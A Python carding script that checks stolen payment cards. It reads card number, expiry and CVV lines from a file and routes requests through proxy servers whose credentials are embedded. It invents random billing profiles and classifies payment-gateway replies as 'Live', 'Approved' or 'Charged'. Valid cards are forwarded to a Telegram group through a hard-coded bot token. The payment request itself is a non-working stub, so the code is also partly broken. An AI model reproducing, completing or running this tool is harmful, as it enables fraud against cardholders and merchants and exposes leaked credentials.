import time
import random
import string
import re
import asyncio
import requests
from aiohttp import ClientSession
from fake_useragent import UserAgent

# Regex pattern to extract card information from cc.txt file
card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

# List of proxies to rotate through
proxy_list = [
    "http://nzvuwsmz:yS6ks569Hy@65.181.174.194:63829",
    "http://nzvuwsmz:yS6ks569Hy@65.181.171.160:62110",
    "http://nzvuwsmz:yS6ks569Hy@65.181.167.98:63631",
    "http://nzvuwsmz:yS6ks569Hy@65.181.170.115:60681",
    "http://nzvuwsmz:yS6ks569Hy@65.181.172.225:59225"
]

# Your bot token and the group chat ID where successful hits will be sent
BOT_TOKEN = "7386696229:AAHmhKvVa03xbWzDgK_vB1HZmBHFo0igAlA"
GROUP_CHAT_ID = -1002219112781  # Replace with your group chat ID

def round_robin_proxy(proxy_list):
    """Yields proxies from the list in a round-robin fashion."""
    while True:
        for proxy in proxy_list:
            yield proxy

proxy_gen = round_robin_proxy(proxy_list)

# Some sample data for generating random profiles
names = ['Jarvis', 'John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia', 'Matthew', 'Ava', 'William']
last_names = ['Sir', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez']
streets = ['Main St', 'Oak St', 'Maple Ave', 'Pine St', 'Cedar Ln']
cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
phones = ['682', '346', '246']
state_data = {'NY': 'New York', 'CA': 'California', 'TX': 'Texas', 'FL': 'Florida'}
zips = {'NY': '10001', 'CA': '90001', 'TX': '75001', 'FL': '33101'}

def generate_random_profile():
    """Generates a random profile for billing details."""
    name = random.choice(names).capitalize()
    last = random.choice(last_names).capitalize()
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    city = random.choice(cities)
    state_code = random.choice(list(state_data.keys()))
    state = state_data[state_code]
    zip_code = zips[state_code]
    phone = f"{random.choice(phones)}{random.randint(1000000, 9999999)}"
    email = f"{name.lower()}.{last.lower()}{random.randint(0, 9999)}@gmail.com"
    username = f"{name.lower()}.{last.lower()}{random.randint(0, 9999)}"

    return {
        "name": name,
        "last": last,
        "street": street,
        "city": city,
        "state_code": state_code,
        "state": state,
        "zip_code": zip_code,
        "phone": phone,
        "email": email,
        "username": username,
    }

def GetStr(string, start, end):
    """Extracts a substring between the start and end strings."""
    if start in string and end in string:
        try:
            return string.split(start)[1].split(end)[0]
        except IndexError:
            return ""
    return ""

async def check_card(card_info, proxy, profile):
    """Checks a card and determines its status."""
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return f"Invalid card details for `{card_info}`."

    cc, mm, yy, cvv = card
    results = []

    async with ClientSession() as session:
        # Simulate Stripe or other request logic here
        await asyncio.sleep(random.uniform(0.5, 1.5))  # Simulate delay for request

        # Simulate a second response check
        second_response = "Simulated response with errors or approvals"
        result = await second_response  # Replace with actual response from your request

        # Check card status based on the simulated result
        Respo = GetStr(
            result,
            '<div id="pmpro_message" class="pmpro_message pmpro_error">',
            "</div>",
        )

        if (
            "Your card does not support this type of purchase." in result
            or "not support" in result
            or "card does not support" in result
            or '"type":"one-time"' in result
        ):
            status = "Approved ✅"
            resp = "Approved CVV"

        elif (
            '"result":"success"' in result
            or '"Thank you. Your order has been received."' in result
            or "SUCCEEDED" in result
            or "APPROVED" in result
            or '"success"' in result
        ):
            status = "Charged 🔥"
            resp = "Payment Successful ✅"

        elif (
            "Invalid account" in result
            or "account_Invalid" in result
            or '"Invalid account": "fail"' in result
        ):
            status = "CCN 🌿"
            resp = "Invalid Account"

        elif (
            '"code":"incorrect_cvc"' in result
            or "security code is incorrect." in result
            or "Your card&#039;s security code is incorrect." in result
            or "incorrect_cvc" in result
            or '"cvc_check": "fail"' in result
            or "security code is invalid." in result
        ):
            status = "CCN Live ✅"
            resp = "Invalid security code"

        elif (
            '"cvc_check":"pass"' in result
            or "Your card zip code is incorrect." in result
            or '"type":"one-time"' in result
            or "incorrect_zip" in result
        ):
            status = "Live ✅"
            resp = "CVV Live"

        elif "requires_action" in result:
            status = "CCN Live ✅"
            resp = "Card Requires Customer Verification"

        elif (
            "Insufficient funds" in result
            or "Your card has insufficient funds." in result
            or "insufficient_funds" in result
        ):
            status = "Card Live ✅"
            resp = "Insufficient Funds 💰"

        elif Respo:
            status = "Declined ❌"
            resp = f"{Respo}"

        else:
            status = "Error ⚠️"
            resp = "Unknown error"

        # If the card is approved or live, send a message to the Telegram group
        if status in ["Approved ✅", "Live ✅", "Charged 🔥"]:
            send_to_telegram(f"𝗛𝗶𝘁: `{cc}|{mm}|{yy}|{cvv}`\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}")

        resp = resp.replace("Error updating default payment method.", "").strip()

        results.append(
            f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`\n𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n"
        )

    return "\n".join(results)

def send_to_telegram(message):
    """Sends a message to a Telegram group using a bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": GROUP_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            print(f"Failed to send message: {response.status_code}")
    except Exception as e:
        print(f"Error sending message: {e}")

async def process_cards_sequentially(cards_info):
    """Processes cards one by one with a 5-second delay between each."""
    for card_info in cards_info:
        proxy = next(proxy_gen)  # Get the next proxy
        profile = generate_random_profile()  # Generate random profile for the card
        result = await check_card(card_info, proxy, profile)

        # Print the result for each card
        print(result)

        # Delay of 5 seconds before checking the next card
        await asyncio.sleep(5)

def read_cc_from_file(filename):
    """Reads credit card data from a text file."""
    try:
        with open(filename, 'r') as file:
            card_info_text = file.read().strip()
        return card_info_text.split("\n")
    except FileNotFoundError:
        print(f"The file '{filename}' was not found.")
        return []

async def main():
    # Read card information from cc.txt
    cards_info = read_cc_from_file('cc.txt')

    # Limit the number of cards to process (e.g., 30)
    if len(cards_info) > 30:
        print("The maximum number of cards allowed is 30. Please reduce the number of cards and try again.")
        return

    # Process the cards one by one with a delay
    print("Processing your cards...")
    start_time = time.time()

    try:
        await process_cards_sequentially(cards_info[:30])  # Limit to 30 for demonstration

        print(f"\n\n𝗧𝗶𝗺𝗲: {round(time.time() - start_time, 2)}s")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

# Run the main function in the event loop
if __name__ == "__main__":
    asyncio.run(main())
